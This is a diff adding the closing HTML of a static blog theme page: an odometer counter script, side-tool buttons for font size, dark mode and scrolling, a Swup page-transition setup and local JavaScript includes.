+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
